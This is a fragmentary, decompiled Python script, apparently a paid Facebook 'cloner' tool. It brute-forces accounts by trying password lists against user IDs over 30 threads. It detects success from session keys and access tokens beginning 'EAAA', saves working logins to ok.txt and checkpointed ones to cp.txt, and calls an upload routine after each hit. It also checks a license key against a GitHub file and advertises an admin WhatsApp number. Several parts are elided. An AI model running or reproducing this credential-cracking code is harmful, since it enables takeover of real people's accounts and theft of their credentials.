...
# Time Succes decompile : 2023-06-01 10:27:51.909999
W = '\033[97;1m' 
R = '\033[91;1m' 
G = '\033[92;1m' 
Y = '\033[93;1m' 
...
def notice():
	...
	runtxt("\033[0;92m ADMIN🧞‍♀️ WATSAPPP🤲https:wa.me/±93702856593")
	subprocess.check_output(["am", "start", "https://wa.me/±93702856593"])
...
class Main:
	def __init__(self):
		...
		self.loop = 0
		try:
			plr = requests.get('https://github.com/RaziqullahAFG/AFGH5/blob/main/AFGH5.py').text
			if basesplit in plr:
				print ("          YOUR KEY : "+ak+Rs+imt)
...
┌───────────────────────────────────────┐
\033[1;33m│ [✓] AUTHOR  
    Sabir Sahil 707\033[1;32m[Saadat]         │
\033[1;34m│ [✓] GITHUB   : \033[41m\033[1;37m |Saadat707\x1b[0m           │
\033[1;35m│ [✓] WHATSAPP :  +93702856593           │
\033[1;36m│ [✓] SABIR SAHIL : \x1b[1;32mPRO PRONOY\x1b[1;97m           │
\033[1;32m└───────────────────────────────────────┘  
         \033[41m\033[1;37m𝐓𝐎𝐎𝐋 𝐀𝐃𝐌𝐈𝐍 [Saadat] [pÏඋඋħÏ]\x1b[0m    
 """)
		print("%s [%s•%s] %sTOOL NAME : %sSaadat❌ PROO CLONER❌"%(G,R,G,B,G))
		print("%s [%s•%s] %sVERSION   : %s707"%(G,R,G,B,G))
		print("%s [%s•%s] %sYOUR KEY  : paid%s%s"%(+ak+Rs+imt,key))
		...
		if hoga in ["", " "]:
			...
			if basesplit in plr:
				...
				httpCaht =  requests.get('https://github.com/RaziqullahAFG/AFGH5/blob/main/AFGH5.py').text
				notice()
				exit()
		elif hoga in ["2", "02"]:
			if basesplit in plr:
		...
		try:
			...
			with ThreadPoolExecutor(max_workers=30) as coeg:
				...
				if len(listpass)<=5:
					exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS"%(R))
				print("%s [*] CRACK WITH PASSWORD -> [\033[0;91m%s\033[0;93m]"%(Y,listpass))
				print("\n%s [+] OK Saadat 707-> ok.txt"%(G))
				print("%s [+] CP  Saadat 707-> cp.txt"%(Y))
				print("%s [!] IF NO RESULT TURN ON AIRPLANE MODE 5 SECONDS\x1b[0m\n"%(R))
				for user in self.id:
					coeg.submit(self.api, user, listpass.split(","))
			exit("\n\n%s [#] CRACK COMPLETE..."%(G))
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			"\r\r %s[>_] [sabir] : %s/%s -> \033[0;92m [ Saadat-OK:%s ]- \033[0;91m[SABIR-CP:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			...
			if "session_key" in response.text and "EAAA" in response.text:
				...
				open("ok.txt","a").write(" [Saadat-OK] %s|%s\n"%(uid, pw))
				uploadoks()
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r \033[0;91m[Saadat-CP] %s|%s\033[0;97m         "%(uid, pw))
